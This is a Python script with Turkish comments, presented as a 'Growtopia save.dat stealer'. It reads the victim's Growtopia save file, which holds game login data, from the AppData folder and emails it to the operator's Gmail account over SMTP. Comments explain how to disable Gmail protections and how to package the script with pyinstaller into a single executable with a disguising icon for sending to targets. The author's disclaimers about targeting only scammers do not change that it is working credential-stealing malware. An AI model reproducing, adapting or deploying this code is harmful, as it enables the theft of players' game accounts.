
###########################
#                         #
#    Developer: splatt    #
#                         #
###########################

'''

Copyright (c) 2021 by splatt

Bu proje ücretle satılamaz/alınamaz

Yaptığınız illegal aktivitelerden ben sorumlu değilim!

'''

####### Growtopia Sav.dat stealer #######

'''
growtopia save.dat stealer by python.

Yapmadan önce, python bilmeniz gerekir.

'''

#############################
#                           #
#       Gerekenler          #
#                           #
#############################
#                           #
#       Python 3.x          #
#                           #
##########################################
#                                        #
#  smtplib > pip install smtplib         #
#  pyinstaller > pip isntall pyinstaller #
#  pathlib > pip install pathlib         #
#                                        #
###########################################
#                                         #
# Not, bu stealerı yapmak için az da olsa #
#veya youtubeden öğrenmiş olmanız gerekir #
#                                         #
###########################################


# Bu dediğim şeyler önemlidir.
'''

Bu save.dat stealerı masum olmayan scammer/küfürbazlara atmak için yaptım!
Masum insanları kandırmayın
Eğer kandırırsanız yaptığınız illegal aktivitelerden ben sorumlu değilim!
Herhangi bir olayda siz sorumlusunuz!

'''
#import modules

import smtplib #smtp > pip install smtplib
import os
import sys
from email.message import EmailMessage
from pathlib import Path #pathlib > pip install pathlib

#Save.dat çalmak için başka bir gmaile geçebilirsin
#Not, gmail hesabını "daha az güvenli uygulama erişimine" aç
#Ayrıca,  2. korumayı devredışı bırak

home = Path.home()
path =str(home)

email = 'Enter username' # > buraya gmailini gir
password = 'Enter password' # > buraya gmailin şifresini gir

# Gmail hesabını daha az güvenli uygulama erişimine aç yoksa save.dat gelmez.
'''

Bu save.dat stealerı masum olmayan scammer/küfürbazlara atmak için yaptım!
Masum insanları kandırmayın
Eğer kandırırsanız yaptığınız illegal aktivitelerden ben sorumlu değilim!
Herhangi bir olayda siz sorumlusunuz!

'''


msg = EmailMessage()
msg['Subject'] = 'save.dat ' # > Burayı değiştirebilirsin.
msg['From'] = email
msg['To'] = email

msg.set_content('save.dat was stolen //splatt')

with open(path + '\AppData\Local\Growtopia\save.dat', 'rb') as f:
    file_data = f.read()
    

msg.add_attachment(file_data, maintype='dat', subtype='dat', filename='save.dat')


#Not : Hiçbir komudu ellemeyin yoksa çalışmaz
#ya da hiçbirşeyi değiştirmeyin!

with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(email, password)
    smtp.send_message(msg)

#pyinstaller -f or --onefile (eğer icon eklemek istiyorsan -i koyarak yap "C:/users/grow.ico")
#pyinstaller --onefile -i "C:/users/grow.ico" splatt.py (bunun gibi)





